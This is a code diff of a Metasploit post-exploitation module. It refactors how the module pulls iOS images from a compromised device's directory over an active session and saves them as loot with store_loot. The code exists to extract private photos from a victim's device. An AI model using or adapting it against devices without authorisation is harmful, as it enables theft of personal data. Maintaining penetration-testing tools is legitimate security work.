@@ -41,16 +41,15 @@ class MetasploitModule < Msf::Post
   end
 
   def enum_img(f_path)
-    path = File.join(Msf::Config.loot_directory, Rex::Text.rand_text_alpha(6))
-    local_path = File.expand_path(path)
-
     ios_imgs = dir(f_path)
-    print_status("Directory for iOS images: #{local_path}")
 
-    opts = { 'block_size' => 262144 }
     ios_imgs.each do |img|
+      next if ['.', '..'].include?(img)
+
       print_status("Downloading image: #{img}")
-      client.fs.file.download_file("#{local_path}/#{img}", "#{f_path}/#{img}", opts)
+      image_data = read_file("#{f_path}/#{img}")
+      loot_path = store_loot('ios.image', 'application/octet-stream', session, image_data, img, "iOS image #{img}")
+      print_good("Image stored at: #{loot_path}")
     rescue StandardError
       print_error("#{img} could not be downloaded")
     end
